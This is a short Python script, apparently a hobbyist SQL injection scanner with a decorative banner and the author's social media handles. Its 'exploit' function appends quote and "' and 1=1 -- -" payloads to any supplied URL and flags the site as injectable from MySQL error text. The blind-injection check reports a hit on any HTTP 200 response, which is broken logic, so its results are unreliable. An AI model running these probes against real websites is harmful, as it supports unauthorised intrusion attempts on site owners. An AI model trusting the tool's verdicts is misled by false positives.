import requests
from colorama import Fore
import sys


Z =  "\033[1;31m"  
X =  "\033[1;33m"  
Z1 =  "\033[2;31m"  
F =  "\033[2;32m"  
A =  "\033[2;34m" 
C =  "\033[2;35m"  
B =  "\033[2;36m" 
Y =  "\033[1;34m"   
black = "\033[30m" 
red = "\033[31m" 
green = "\033[32m" 
orange = "\033[33m" 
blue = "\033[34m" 
purple = "\033[35m" 
heavenly = "\033[36m" 
light_gray = "\033[37m"

def Information():
    ip = requests.get("https://wtfismyip.com/text").text.strip()
    print(f"""
     ▄▄   ▄▄ ▄▄▄▄▄▄               ▄▄   ▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄   ▄▄▄▄▄▄   ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄ 
    █  █▄█  █   ▄  █             █  █ █  █       █   ▄  █ █   ▄  █ █      █       █       █   █
    █       █  █ █ █             █  █▄█  █    ▄▄▄█  █ █ █ █  █ █ █ █  ▄   █▄     ▄█▄     ▄█   █
    █       █   █▄▄█▄            █       █   █▄▄▄█   █▄▄█▄█   █▄▄█▄█ █▄█  █ █   █   █   █ █   █
    █       █    ▄▄  █           █       █    ▄▄▄█    ▄▄  █    ▄▄  █      █ █   █   █   █ █   █
    █ ██▄██ █   █  █ █            █     ██   █▄▄▄█   █  █ █   █  █ █  ▄   █ █   █   █   █ █   █
    █▄█   █▄█▄▄▄█  █▄█             █▄▄▄█ █▄▄▄▄▄▄▄█▄▄▄█  █▄█▄▄▄█  █▄█▄█ █▄▄█ █▄▄▄█   █▄▄▄█ █▄▄▄█
      
                             ___                    ___  
                            (o o)                  (o o) 
                           (  V  ) Mr <> Verratti (  V  )
                           --m-m--------------------m-m--

\033[1;37m+-----------------------------+
| \033[1;31m[#] \033[1;37mMy channel : @llllIllIIl |
| \033[1;31m[#] \033[1;37mInstagram : @0xi0m       |                                 
| \033[1;31m[#] \033[1;37mTelegram : @Verratti3    |
| \033[1;31m[#] \033[1;37mVersion : 1.0.1          |
+-----------------------------+

    Welcome in my tool 
    used : python3 tool.py
                
    your ip >> {ip}
    good luck
                """)


Information()

def exploit(url):
    try:
        payload = "'"
        j = requests.get(url + payload)

        if "MySQL" in j.text or "You have an error in your SQL syntax" in j.text:
            print(url + f"{Fore.RED}SQL injection{Fore.WHITE} (single quotes)")

        payload = '"'
        j = requests.get(url + payload)

        if "MySQL" in j.text or "You have an error in your SQL syntax" in j.text:
            print(url + f"{Fore.RED}SQL injection (double quotes){Fore.WHITE}")

        payload = "' and 1=1 -- -"
        j = requests.get(url + payload)

        if j.status_code == 200:
            print(url + f"{Fore.RED}Blind SQL injection{Fore.WHITE} (single quotes)")

        payload = '" and 1=1 -- -'
        j = requests.get(url + payload)

        if j.status_code == 200:
            print(url + f"{Fore.WHITE}Blind {Fore.RED}SQL injection {Fore.WHITE}(double quotes)")

    except KeyboardInterrupt:
        sys.exit()
    except:
        pass
